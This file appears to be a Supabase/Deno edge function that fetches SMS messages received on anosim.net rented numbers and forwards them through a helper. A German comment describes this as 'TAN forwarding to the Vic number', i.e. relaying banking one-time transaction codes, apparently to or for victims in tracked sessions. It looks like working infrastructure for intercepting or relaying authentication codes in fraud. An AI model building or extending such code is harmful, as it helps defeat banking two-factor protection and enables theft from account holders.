import { forwardByPhoneIdentifier } from "../_shared/forwardTan.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    let { url } = await req.json();

    const lower = url?.toLowerCase() ?? "";
    if (!url || !(lower.includes("anosim.net/api/v1/orderbookingshare") || lower.includes("anosim.net/share/orderbooking"))) {
      return new Response(JSON.stringify({ error: "Invalid URL" }), {
        status: 400,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // Sessions store the URL as entered; remember it for forwarding lookup.
    const storedIdentifier = String(url);

    // Convert share URL to API URL
    url = url.replace("/share/orderbooking?", "/api/v1/orderbookingshare?");

    const res = await fetch(url);
    const data = await res.json();

    // TAN-Weiterleitung an die Vic-Nummer (nur aktive Sessions, idempotent)
    try {
      const smsList = Array.isArray(data?.sms) ? data.sms : [];
      if (smsList.length > 0) {
        const messages = smsList.map((m: any) => ({
          sender: m?.messageSender ?? m?.sender ?? "Unbekannt",
          date: m?.messageDate ?? m?.date ?? new Date().toISOString(),
          text: m?.messageText ?? m?.text ?? "",
        }));
        // Try both the stored and the converted identifier — sessions may
        // hold either form.
        const apiIdentifier = storedIdentifier.replace("/share/orderbooking?", "/api/v1/orderbookingshare?");
        await forwardByPhoneIdentifier(storedIdentifier, messages)
          .then(async (r) => {
            if (r.checked === 0 && r.reason === "no_active_session" && apiIdentifier !== storedIdentifier) {
              await forwardByPhoneIdentifier(apiIdentifier, messages);
            }
          });
      }
    } catch (e) {
      console.error("forwardByPhoneIdentifier failed:", e);
    }

    return new Response(JSON.stringify(data), {
      status: 200,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (err) {
    return new Response(JSON.stringify({ error: String(err) }), {
      status: 500,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
